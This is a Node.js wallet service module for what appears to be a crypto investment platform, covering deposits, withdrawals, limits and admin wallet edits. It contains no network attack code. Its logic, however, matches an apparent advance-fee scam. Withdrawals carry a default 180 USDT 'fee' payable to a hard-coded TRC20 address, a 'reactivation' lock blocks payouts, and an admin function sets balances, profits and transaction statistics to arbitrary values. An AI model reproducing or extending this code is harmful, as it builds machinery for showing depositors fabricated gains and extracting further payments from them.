const Wallet = require('../models/Wallet');
const Transaction = require('../models/Transaction');
const Deposit = require('../models/Deposit');
const Withdrawal = require('../models/Withdrawal');
const { v4: uuidv4 } = require('uuid');
const AppError = require('../utils/appError');
const logger = require('../utils/logger');
const currencyService = require('./currencyService');

// ═══════════════════════════════════════════════════════════
// ✅ DEFAULT WITHDRAWAL SETTINGS (single source of truth)
// ═══════════════════════════════════════════════════════════
const DEFAULT_WITHDRAWAL_SETTINGS = {
  withdrawalLimit: 1500,
  thresholdLimit: 1000,
  minimumWithdrawal: 1,
  iban: {
    feeAmount: 180,
    feeWalletAddress: 'TJmVQ5zU2c9dQ8x7yZPq3nKcRvXwHbFdA1',
    feeWalletLabel: 'USDT (TRC20)',
    feePaid: false,
    lastPaidAt: null,
  },
  ccp: {
    feeAmount: 180,
    feeWalletAddress: 'TJmVQ5zU2c9dQ8x7yZPq3nKcRvXwHbFdA1',
    feeWalletLabel: 'USDT (TRC20)',
    feePaid: false,
    lastPaidAt: null,
  },
  reactivation: {
    isRequired: true,
    isLocked: false,
    lockedAt: null,
    unlockedAt: null,
    unlockCount: 0,
  },
  bypassSecurityCheck: false,
};

const DEFAULT_TRANSACTION_STATS = {
  totalTransactions: 0,
  totalDepositCount: 0,
  totalWithdrawalCount: 0,
  lastDepositAt: null,
  lastWithdrawalAt: null,
};

class WalletService {
  // ═══════════════════════════════════════════════════════════
  // ✅ CREATE WALLET FOR NEW USER (with full settings)
  // ═══════════════════════════════════════════════════════════
  async createWallet(userId) {
    // Idempotent — return existing wallet if it already exists
    const existing = await Wallet.findOne({ user: userId });
    if (existing) return existing;

    const wallet = new Wallet({
      user: userId,

      // Balances
      balance: 0,
      profitBalance: 0,
      referralBalance: 0,
      totalDeposits: 0,
      totalWithdrawals: 0,

      // Crypto addresses (empty by default)
      cryptoAddresses: {
        BTC: '',
        ETH: '',
        USDT: '',
        BNB: '',
        TRX: '',
      },

      // Pending amounts
      pendingDepositAmount: 0,
      pendingWithdrawalAmount: 0,

      // ✅ Per-account withdrawal settings
      withdrawalSettings: DEFAULT_WITHDRAWAL_SETTINGS,

      // ✅ Transaction counters
      transactionStats: DEFAULT_TRANSACTION_STATS,

      // Account tier
      accountTier: 'standard',
    });

    await wallet.save();
    logger.info(`✅ Wallet created for user ${userId}`);
    return wallet;
  }

  // Get wallet with balance in user's currency
  async getWallet(userId, currency = 'USD') {
    const wallet = await Wallet.findOne({ user: userId });
    if (!wallet) throw new AppError('Wallet not found', 404);

    // Convert balances to user's currency
    const rates = await currencyService.getRates();
    const rate = rates[currency] || 1;
    return {
      ...wallet.toObject(),
      balanceDisplay: wallet.balance * rate,
      profitBalanceDisplay: wallet.profitBalance * rate,
      referralBalanceDisplay: wallet.referralBalance * rate,
      totalDepositsDisplay: wallet.totalDeposits * rate,
      totalWithdrawalsDisplay: wallet.totalWithdrawals * rate,
    };
  }

  // Update balance (increase or decrease)
  async updateBalance(userId, amount, type, description = '') {
    const wallet = await Wallet.findOne({ user: userId });
    if (!wallet) throw new AppError('Wallet not found', 404);

    // Determine which balance to update based on type
    let balanceField = 'balance';
    if (type === 'profit') balanceField = 'profitBalance';
    else if (type === 'referral') balanceField = 'referralBalance';
    else if (type === 'deposit') balanceField = 'balance';
    else if (type === 'withdrawal') balanceField = 'balance';

    const update = {};
    if (amount > 0) {
      update.$inc = { [balanceField]: amount };
    } else {
      const current = wallet[balanceField];
      if (current + amount < 0) {
        throw new AppError(`Insufficient ${balanceField} balance`, 400);
      }
      update.$inc = { [balanceField]: amount };
    }

    // Update totals + stats for deposits/withdrawals
    if (type === 'deposit') {
      update.$inc = { ...update.$inc, totalDeposits: amount };
      update.$inc['transactionStats.totalDepositCount'] = 1;
      update.$inc['transactionStats.totalTransactions'] = 1;
      update.$set = { ...(update.$set || {}), 'transactionStats.lastDepositAt': new Date() };
    } else if (type === 'withdrawal') {
      update.$inc = { ...update.$inc, totalWithdrawals: Math.abs(amount) };
      update.$inc['transactionStats.totalWithdrawalCount'] = 1;
      update.$inc['transactionStats.totalTransactions'] = 1;
      update.$set = { ...(update.$set || {}), 'transactionStats.lastWithdrawalAt': new Date() };
    } else {
      update.$inc['transactionStats.totalTransactions'] = 1;
    }

    const updated = await Wallet.findByIdAndUpdate(wallet._id, update, { new: true });

    // Log transaction
    const transaction = new Transaction({
      user: userId,
      type: type,
      amount: Math.abs(amount),
      currency: 'USD',
      status: 'completed',
      reference: `TXN-${uuidv4().slice(0, 8).toUpperCase()}`,
      description,
    });
    await transaction.save();

    return updated;
  }

  // Record pending deposit (for admin approval)
  async recordDeposit(userId, amount, cryptoCurrency, walletAddress, proofImage) {
    const reference = `DEP-${uuidv4().slice(0, 8).toUpperCase()}`;
    const deposit = new Deposit({
      user: userId,
      amount,
      currency: 'USD',
      cryptoCurrency,
      walletAddress,
      proofImage,
      reference,
      status: 'pending',
    });
    await deposit.save();
    return deposit;
  }

  // Approve deposit
  async approveDeposit(depositId, adminId) {
    const deposit = await Deposit.findById(depositId);
    if (!deposit) throw new AppError('Deposit not found', 404);
    if (deposit.status !== 'pending') throw new AppError('Deposit already processed', 400);

    deposit.status = 'approved';
    deposit.approvedBy = adminId;
    deposit.approvedAt = new Date();
    await deposit.save();

    await this.updateBalance(
      deposit.user,
      deposit.amount,
      'deposit',
      `Deposit #${deposit.reference} approved`
    );
    return deposit;
  }

  // Request withdrawal (checks KYC + per-account limits)
  async requestWithdrawal(userId, amount, cryptoCurrency, walletAddress, kycStatus) {
    if (kycStatus !== 'verified') {
      throw new AppError('Complete KYC verification before withdrawing', 403);
    }

    const wallet = await Wallet.findOne({ user: userId });
    if (!wallet) throw new AppError('Wallet not found', 404);
    if (wallet.balance < amount) throw new AppError('Insufficient balance', 400);

    // ✅ Per-account limit checks
    if (wallet.withdrawalSettings) {
      const s = wallet.withdrawalSettings;

      if (s.reactivation?.isLocked) {
        throw new AppError('Account is locked. Please complete reactivation.', 403);
      }

      if (amount < (s.minimumWithdrawal ?? 1)) {
        throw new AppError(`Minimum withdrawal is ${s.minimumWithdrawal ?? 1}`, 400);
      }

      if (amount > (s.withdrawalLimit ?? 1500)) {
        throw new AppError(`Amount exceeds your withdrawal limit of ${s.withdrawalLimit}`, 400);
      }
    }

    const reference = `WTH-${uuidv4().slice(0, 8).toUpperCase()}`;
    const withdrawal = new Withdrawal({
      user: userId,
      amount,
      currency: 'USD',
      cryptoCurrency,
      walletAddress,
      reference,
      status: 'pending',
    });
    await withdrawal.save();
    return withdrawal;
  }

  // Approve withdrawal (admin)
  async approveWithdrawal(withdrawalId, adminId) {
    const withdrawal = await Withdrawal.findById(withdrawalId);
    if (!withdrawal) throw new AppError('Withdrawal not found', 404);
    if (withdrawal.status !== 'pending') throw new AppError('Withdrawal already processed', 400);

    await this.updateBalance(
      withdrawal.user,
      -withdrawal.amount,
      'withdrawal',
      `Withdrawal #${withdrawal.reference} approved`
    );

    withdrawal.status = 'approved';
    withdrawal.approvedBy = adminId;
    withdrawal.approvedAt = new Date();
    await withdrawal.save();
    return withdrawal;
  }

  // Mark withdrawal as paid
  async markWithdrawalPaid(withdrawalId, transactionHash) {
    const withdrawal = await Withdrawal.findById(withdrawalId);
    if (!withdrawal) throw new AppError('Withdrawal not found', 404);
    if (withdrawal.status !== 'approved') throw new AppError('Withdrawal not approved yet', 400);

    withdrawal.status = 'paid';
    withdrawal.transactionHash = transactionHash;
    withdrawal.paidAt = new Date();
    await withdrawal.save();
    return withdrawal;
  }

  // ✅ NEW: Update withdrawal settings for a specific user
  async updateWithdrawalSettings(userId, updates) {
    const wallet = await Wallet.findOne({ user: userId });
    if (!wallet) throw new AppError('Wallet not found', 404);

    if (!wallet.withdrawalSettings) {
      wallet.withdrawalSettings = DEFAULT_WITHDRAWAL_SETTINGS;
    }
    const s = wallet.withdrawalSettings;

    if (updates.withdrawalLimit !== undefined) s.withdrawalLimit = updates.withdrawalLimit;
    if (updates.thresholdLimit !== undefined) s.thresholdLimit = updates.thresholdLimit;
    if (updates.minimumWithdrawal !== undefined) s.minimumWithdrawal = updates.minimumWithdrawal;
    if (updates.bypassSecurityCheck !== undefined) s.bypassSecurityCheck = updates.bypassSecurityCheck;

    if (updates.iban) {
      if (updates.iban.feeAmount !== undefined) s.iban.feeAmount = updates.iban.feeAmount;
      if (updates.iban.feeWalletAddress !== undefined) s.iban.feeWalletAddress = updates.iban.feeWalletAddress;
      if (updates.iban.feeWalletLabel !== undefined) s.iban.feeWalletLabel = updates.iban.feeWalletLabel;
      if (updates.iban.feePaid !== undefined) {
        s.iban.feePaid = updates.iban.feePaid;
        if (updates.iban.feePaid) s.iban.lastPaidAt = new Date();
      }
    }

    if (updates.ccp) {
      if (updates.ccp.feeAmount !== undefined) s.ccp.feeAmount = updates.ccp.feeAmount;
      if (updates.ccp.feeWalletAddress !== undefined) s.ccp.feeWalletAddress = updates.ccp.feeWalletAddress;
      if (updates.ccp.feeWalletLabel !== undefined) s.ccp.feeWalletLabel = updates.ccp.feeWalletLabel;
      if (updates.ccp.feePaid !== undefined) {
        s.ccp.feePaid = updates.ccp.feePaid;
        if (updates.ccp.feePaid) s.ccp.lastPaidAt = new Date();
      }
    }

    if (updates.reactivation) {
      if (updates.reactivation.isRequired !== undefined) {
        s.reactivation.isRequired = updates.reactivation.isRequired;
      }
      if (updates.reactivation.isLocked !== undefined) {
        s.reactivation.isLocked = updates.reactivation.isLocked;
        if (updates.reactivation.isLocked) s.reactivation.lockedAt = new Date();
        else s.reactivation.unlockedAt = new Date();
      }
      if (updates.reactivation.unlockCount !== undefined) {
        s.reactivation.unlockCount = updates.reactivation.unlockCount;
      }
    }

    await wallet.save();
    return wallet;
  }

    // ═══════════════════════════════════════════════════════════
  // ✅ ADMIN: Update ANY wallet field (balances + settings + stats)
  // ═══════════════════════════════════════════════════════════
  async updateFullWallet(userId, payload) {
    const wallet = await Wallet.findOne({ user: userId });
    if (!wallet) throw new AppError('Wallet not found', 404);

    const {
      // Balances
      balance,
      profitBalance,
      referralBalance,
      totalDeposits,
      totalWithdrawals,
      pendingDepositAmount,
      pendingWithdrawalAmount,

      // Crypto addresses
      cryptoAddresses,

      // Withdrawal settings
      withdrawalSettings,

      // Transaction stats
      transactionStats,

      // Account tier
      accountTier,
    } = payload;

    // ─── Balances ─────────────────────────────────────────
    if (balance !== undefined) wallet.balance = Number(balance) || 0;
    if (profitBalance !== undefined) wallet.profitBalance = Number(profitBalance) || 0;
    if (referralBalance !== undefined) wallet.referralBalance = Number(referralBalance) || 0;
    if (totalDeposits !== undefined) wallet.totalDeposits = Number(totalDeposits) || 0;
    if (totalWithdrawals !== undefined) wallet.totalWithdrawals = Number(totalWithdrawals) || 0;
    if (pendingDepositAmount !== undefined) wallet.pendingDepositAmount = Number(pendingDepositAmount) || 0;
    if (pendingWithdrawalAmount !== undefined) wallet.pendingWithdrawalAmount = Number(pendingWithdrawalAmount) || 0;

    // ─── Crypto addresses ─────────────────────────────────
    if (cryptoAddresses && typeof cryptoAddresses === 'object') {
      wallet.cryptoAddresses = {
        ...wallet.cryptoAddresses.toObject?.() ?? wallet.cryptoAddresses,
        ...cryptoAddresses,
      };
    }

    // ─── Withdrawal settings (deep merge) ─────────────────
    if (withdrawalSettings) {
      if (!wallet.withdrawalSettings) {
        wallet.withdrawalSettings = DEFAULT_WITHDRAWAL_SETTINGS;
      }
      const s = wallet.withdrawalSettings;
      const u = withdrawalSettings;

      if (u.withdrawalLimit !== undefined) s.withdrawalLimit = Number(u.withdrawalLimit) || 0;
      if (u.thresholdLimit !== undefined) s.thresholdLimit = Number(u.thresholdLimit) || 0;
      if (u.minimumWithdrawal !== undefined) s.minimumWithdrawal = Number(u.minimumWithdrawal) || 0;
      if (u.bypassSecurityCheck !== undefined) s.bypassSecurityCheck = !!u.bypassSecurityCheck;

      // IBAN block
      if (u.iban) {
        if (u.iban.feeAmount !== undefined) s.iban.feeAmount = Number(u.iban.feeAmount) || 0;
        if (u.iban.feeWalletAddress !== undefined) s.iban.feeWalletAddress = u.iban.feeWalletAddress;
        if (u.iban.feeWalletLabel !== undefined) s.iban.feeWalletLabel = u.iban.feeWalletLabel;
        if (u.iban.feePaid !== undefined) {
          s.iban.feePaid = !!u.iban.feePaid;
          if (u.iban.feePaid) s.iban.lastPaidAt = new Date();
        }
      }

      // CCP block
      if (u.ccp) {
        if (u.ccp.feeAmount !== undefined) s.ccp.feeAmount = Number(u.ccp.feeAmount) || 0;
        if (u.ccp.feeWalletAddress !== undefined) s.ccp.feeWalletAddress = u.ccp.feeWalletAddress;
        if (u.ccp.feeWalletLabel !== undefined) s.ccp.feeWalletLabel = u.ccp.feeWalletLabel;
        if (u.ccp.feePaid !== undefined) {
          s.ccp.feePaid = !!u.ccp.feePaid;
          if (u.ccp.feePaid) s.ccp.lastPaidAt = new Date();
        }
      }

      // Reactivation block
      if (u.reactivation) {
        if (u.reactivation.isRequired !== undefined) {
          s.reactivation.isRequired = !!u.reactivation.isRequired;
        }
        if (u.reactivation.isLocked !== undefined) {
          s.reactivation.isLocked = !!u.reactivation.isLocked;
          if (u.reactivation.isLocked) s.reactivation.lockedAt = new Date();
          else s.reactivation.unlockedAt = new Date();
        }
        if (u.reactivation.unlockCount !== undefined) {
          s.reactivation.unlockCount = Number(u.reactivation.unlockCount) || 0;
        }
      }
    }

    // ─── Transaction stats ────────────────────────────────
    if (transactionStats) {
      if (!wallet.transactionStats) {
        wallet.transactionStats = DEFAULT_TRANSACTION_STATS;
      }
      const t = wallet.transactionStats;
      const u = transactionStats;

      if (u.totalTransactions !== undefined) t.totalTransactions = Number(u.totalTransactions) || 0;
      if (u.totalDepositCount !== undefined) t.totalDepositCount = Number(u.totalDepositCount) || 0;
      if (u.totalWithdrawalCount !== undefined) t.totalWithdrawalCount = Number(u.totalWithdrawalCount) || 0;
      if (u.lastDepositAt !== undefined) t.lastDepositAt = u.lastDepositAt ? new Date(u.lastDepositAt) : null;
      if (u.lastWithdrawalAt !== undefined) t.lastWithdrawalAt = u.lastWithdrawalAt ? new Date(u.lastWithdrawalAt) : null;
    }

    // ─── Account tier ─────────────────────────────────────
    if (accountTier !== undefined) {
      wallet.accountTier = accountTier;
    }

    await wallet.save();
    logger.info(`✅ Wallet updated for user ${userId}`);
    return wallet;
  }
}

module.exports = new WalletService();